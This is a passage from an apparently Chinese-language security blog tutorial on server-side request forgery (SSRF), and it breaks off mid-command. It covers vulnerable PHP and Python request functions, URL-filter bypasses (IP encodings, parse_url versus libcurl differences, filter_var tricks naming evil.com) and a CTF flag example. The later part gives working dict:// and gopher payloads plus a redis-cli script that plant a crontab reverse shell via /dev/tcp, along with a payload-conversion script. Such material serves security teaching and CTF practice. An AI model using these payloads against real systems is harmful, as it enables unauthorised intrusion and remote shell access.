class="line">$fp = fsockopen(<span class="string">"www.example.com"</span>, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$errstr ($errno)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">"GET / HTTP/1.1\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Host: www.example.com\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>curl_exec</li></ul><p>执行 cURL 会话，注意cURL的版本，低版本往往有很多bypass方法，后文有提到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.example.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Python的urllib库"><a href="#Python的urllib库" class="headerlink" title="Python的urllib库"></a>Python的urllib库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">info = urllib.urlopen(url)</span><br><span class="line">print(info)</span><br></pre></td></tr></table></figure><p>前几年，存在urllib http头注入漏洞，借此可以实现对内网未授权仿问的redis服务器getshell</p><p>原理是HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p><p>就像:<code>http://127.0.0.1%0d%0aset%20some%20bad%0d%0a:6399/</code>执行redis命令</p><h3 id="出现场景"><a href="#出现场景" class="headerlink" title="出现场景"></a>出现场景</h3><ol><li><p>社交分享功能：获取超链接的标题等内容进行显示</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译：给网址翻译对应网页的内容</p></li><li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p></li><li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p></li><li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p></li><li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p></li><li><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li></ol><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="0x01-IP进制转换"><a href="#0x01-IP进制转换" class="headerlink" title="0x01 IP进制转换"></a>0x01 IP进制转换</h3><table><thead><tr><th>内网IP段</th><th></th></tr></thead><tbody><tr><td>127.0.0.0/8</td><td>127.0.0.0 ~ 127.255.255.255</td></tr><tr><td>192.168.0.0 /16</td><td>192.168.0.0 ~ 192.168.255.255</td></tr><tr><td>10.0.0.0/8</td><td>10.0.0.0 ~ 10.255.255.255</td></tr><tr><td>172.16.0.0/12</td><td>172.16.0.0 ~ 172.31.255.255</td></tr></tbody></table><p>之前WordPress &lt;4.5 的SSRF就是利用ip转为八进制来访问内网</p><p>如192.168.0.1 可转换为</p><p>8 进制格式：0300.0250.0.1</p><p>16 进制格式：0xC0.0xA8.0.1</p><p>10 进制整数格式：3232235521</p><p>16 进制整数格式：0xC0A80001 </p><p>还有一种特殊的<strong>省略模式</strong>，例如10.0.0.1这个 IP 可以写成10.1</p><p>转10进制整数IP略麻烦，可用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">int_ip = <span class="string">''</span></span><br><span class="line">i = ip.split(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">for</span> ii <span class="keyword">in</span> i:</span><br><span class="line">t = str(bin(int(ii)))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">int_ip += t</span><br><span class="line"><span class="keyword">print</span> str(int(int_ip,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="0x02-URL解析绕过"><a href="#0x02-URL解析绕过" class="headerlink" title="0x02 URL解析绕过"></a>0x02 URL解析绕过</h3><p>URL语法：</p><p><code>&lt;scheme&gt;://&lt;username&gt;:&lt;passwd&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</code></p><ol><li><p>指向任意 ip 的域名xip.io, <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a></p></li><li><p><a href="http://www.baidu.com@127.0.0.1/或http://www.baidu.com#127.0.0.1/" target="_blank" rel="noopener">http://www.baidu.com@127.0.0.1/或http://www.baidu.com#127.0.0.1/</a></p></li><li><p>短网址 <a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p></li><li><p>句号绕过 127。0。0。1</p></li><li><p>Enclosed alphanumerics绕过</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="0x03-parse-url与libcurl对curl的解析差异"><a href="#0x03-parse-url与libcurl对curl的解析差异" class="headerlink" title="0x03 parse_url与libcurl对curl的解析差异"></a>0x03 parse_url与libcurl对curl的解析差异</h3><p>geek game之前一道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//error_reporting(E_ALL); </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        dir(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//var_dump($hostname); </span></span><br><span class="line"></span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">//var_dump($url); </span></span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//hint23333: </span></span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"><span class="comment">//phpinfo in phpinfo.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接访问flag.php返回Your ip is not 127.0.0.1,so you can not see flag!</p><p>即需要其自身访问<a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a></p><p>从代码来看，其通过parse_url获取<code>$url</code>的hostname，判断是否是本地地址，只有非本地地址才会用curl访问</p><p>利用parse_url与libcurl对curl的解析差异的trick</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">完整url: scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line">这里仅讨论url中不含&apos;?&apos;的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">http://u:p@a.com:80@b.com/</span><br><span class="line"></span><br><span class="line">php解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    host: b.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p@a.com:80</span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: a.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: 80</span><br><span class="line">    后面的@b.com/会被忽略掉</span><br></pre></td></tr></table></figure><p>这里当<code>$url</code>为<code>http://u:p@127.0.0.1:80@baidu.com/flag.php</code>时</p><p>parse_url的解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a = parse_url(<span class="string">'http://u:p@127.0.0.1:80@baidu.com/flag.php'</span>); var_dump($a);</span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"baidu.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"u"</span></span><br><span class="line">  [<span class="string">"pass"</span>]=&gt;</span><br><span class="line">  string(<span class="number">14</span>) <span class="string">"p@127.0.0.1:80"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"/flag.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问flag.php</p><p><img src="https://i.loli.net/2018/10/18/5bc84fc8009c0.png" alt="11.png"></p><h3 id="0x04-filter-var-绕过"><a href="#0x04-filter-var-绕过" class="headerlink" title="0x04 filter_var( )绕过"></a>0x04 filter_var( )绕过</h3><p>filter_var — 使用特定的过滤器过滤一个变量</p><p>用法：</p><p><code>filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed</code></p><p><code>FILTER_VALIDATE_EMAIL</code> 检查是否为有效邮箱</p><p><code>FILTER_VALIDATE_URL</code> 检查是否为有效url</p><p>引用国外一篇文章中的示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filter_var</code>对url进行check，<code>parse_url</code>获取url的host，对host进行正则匹配，判断是否以google.com结尾，是则curl访问</p><p>这个关键还是看curl能否访问</p><p>之前文章中可能是在PHP7.0.25 cURL 7.47.0的近似环境下，所以有以下bypass方法</p><ul><li><p>通过制定端口让google.com不被解析成主机名</p><ul><li><p><code>0://evil.com:80;google.com:80/</code></p></li><li><p><code>0://evil.com:80,google.com:80/</code></p></li></ul></li><li><p>利用bash空变量，请求evil.com</p><ul><li><code>0://evil$google.com</code></li></ul></li></ul><p>在 PHP Version 7.1.19,cURL 7.54.0 环境下，大部分bybass就不管用了</p><p>但可以使用<code>url=0://107.172.6.33:7788;baidu.com:80/</code>达到请求任意ip，任意端口的目的，前提是代码中exec curl那行没有双引号</p><p>猜测7.45.0的curl应该是对port进行了检测</p><p>不过测试发现php 7.2.2，cURL 7.52.1环境下同样有问题</p><p><img src="https://i.loli.net/2019/01/17/5c409f1eb6c57.png" alt="https://i.loli.net/2019/01/17/5c409f1eb6c57.png"></p><p><img src="https://i.loli.net/2019/01/17/5c409fb3e0ff0.png" alt="https://i.loli.net/2019/01/17/5c409fb3e0ff0.png"></p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="0x01-302跳转"><a href="#0x01-302跳转" class="headerlink" title="0x01 302跳转"></a>0x01 302跳转</h3><p>要求服务端一般为cURL方法，CURLOPT_FOLLOWLOCATION为TRUE, 若服务器端对host进行了过滤，如过滤本地host，此时可用302跳转</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                                                                                </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;                                                         </span><br><span class="line">    $ch = curl_init();                                                       </span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);                                     </span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);                                     </span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">true</span>);                          </span><br><span class="line">    curl_exec($ch);                                                          </span><br><span class="line">    curl_close($ch);                                                         </span><br><span class="line">&#125;                                                                            </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];                                                                                                                           </span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure><table><thead><tr><th>常见协议利用</th><th></th></tr></thead><tbody><tr><td>Http/s 协议</td><td><a href="http://example.com:8080/" target="_blank" rel="noopener">http://example.com:8080/</a></td></tr><tr><td>Dict 协议</td><td>dict://example.com:8080/helo:dict</td></tr><tr><td>Gopher 协议</td><td>gopher://example.com:8080/gopher</td></tr><tr><td>File 协议</td><td>file:///etc/passwd</td></tr></tbody></table><p>302跳转可以使用http/https, dict, gopher协议，不支持file，详细见: <a href="https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html" target="_blank" rel="noopener">https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html</a></p><ul><li>dict协议探测主机</li></ul><p><img src="https://i.loli.net/2019/01/16/5c3f235c390ab.png" alt="https://i.loli.net/2019/01/16/5c3f235c390ab.png"></p><p>dict://127.0.0.1:6379/info查看redis配置信息</p><p>发出以下dict请求可以用redis反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/spool/cron</span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:root</span><br><span class="line">dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1nn</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure><ul><li>Gopher 协议拓展攻击面</li></ul><h3 id="0x02-Gopher"><a href="#0x02-Gopher" class="headerlink" title="0x02 Gopher"></a>0x02 Gopher</h3><h4 id="利用Gopher协议进行redis反弹shell"><a href="#利用Gopher协议进行redis反弹shell" class="headerlink" title="利用Gopher协议进行redis反弹shell"></a>利用Gopher协议进行redis反弹shell</h4><p>redis反弹shell的bash脚本，以<code>bash this.sh 127.0.0.1 6379</code>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><blockquote><p>原理是写入反弹shell的crontab计划任务</p></blockquote><p>使用gopher协议实现redis反弹shell，一般用socat端口转发以捕获redis攻击的数据包</p><p><code>socat -v tcp-listen:8888,fork tcp-connect:localhost:6379</code></p><p>用JoyChou大佬的脚本把数据转为gopher格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure><p>本地测试写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 